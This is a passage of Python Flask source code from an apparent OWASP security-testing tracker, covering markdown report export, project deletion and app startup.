                evidence = evidence[:97] + '...'
            elif not item.evidence:
                evidence = 'No evidence provided'
            
            markdown_content.append(f"| {item.owasp_id} | {item.title.replace('|', '\\|')} | {status_emoji} {item.finding_status.replace('_', ' ').title()} | {risk_level} | {evidence} |")
    
    # Detailed findings for failed tests
    failed_items = [item for item in test_items if item.finding_status == 'fail']
    if failed_items:
        markdown_content.append(f"\n## Detailed Findings")
        
        for item in failed_items:
            markdown_content.append(f"\n### {item.owasp_id}: {item.title}")
            markdown_content.append(f"**Category:** {item.category}")
            markdown_content.append(f"**Risk Level:** {item.risk_level.title() if item.risk_level else 'Not Specified'}")
            
            if item.evidence:
                markdown_content.append(f"\n**Evidence:**")
                markdown_content.append(f"```")
                markdown_content.append(item.evidence)
                markdown_content.append(f"```")
            
            markdown_content.append(f"\n---")
    
    # Create response
    content = '\n'.join(markdown_content)
    response = make_response(content)
    response.headers['Content-Type'] = 'text/markdown'
    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_report.md"'
    
    return response

@app.route('/project/<int:project_id>/delete', methods=['POST'])
def delete_project(project_id):
    """Delete a project and all associated test items"""
    project = db.get_or_404(Project, project_id)
    
    try:
        # Delete associated test items (handled by cascade)
        # Delete auto test results
        AutoTestResult.query.filter_by(project_id=project_id).delete()
        
        # Delete the project
        db.session.delete(project)
        db.session.commit()
        
        flash(f'Project "{project.name}" has been deleted successfully.', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error deleting project: {str(e)}', 'error')
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    port = int(os.getenv('PORT', 5001))
    app.run(debug=True, host='0.0.0.0', port=port)
